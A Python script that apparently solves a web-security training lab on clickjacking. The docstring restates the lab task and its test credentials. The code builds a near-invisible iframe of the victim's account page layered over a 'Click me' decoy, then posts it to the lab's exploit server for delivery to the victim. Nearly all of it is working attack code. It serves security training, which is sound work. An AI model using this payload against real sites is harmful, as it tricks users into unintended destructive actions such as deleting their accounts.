'''
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter
Note

The victim will be using Chrome so test your exploit on that browser.

'''

import requests

requests.packages.urllib3.disable_warnings() 

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

lab_id = "0a9b00fb043f2898804d08360121007a"
url = f"https://{lab_id}.web-security-academy.net/"
exploit_svr = f"https://exploit-{lab_id}.exploit-server.net/"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

html = f'''
<style>
    iframe {{
        position:relative;
        width:500px;
        height:700px;
        opacity: 0.00001;
        z-index: 2;
    }}
    div {{
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }}
</style>
<div>Click me</div>
<iframe src="https://{lab_id}.web-security-academy.net/my-account"></iframe>
'''

payload = {
    'urlIsHttps':'on',
    'responseFile':'/exploit',
    'responseHead':'''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
    'responseBody':html,
    'formAction':'DELIVER_TO_VICTIM'
}
s.post(f"{exploit_svr}", data=payload)
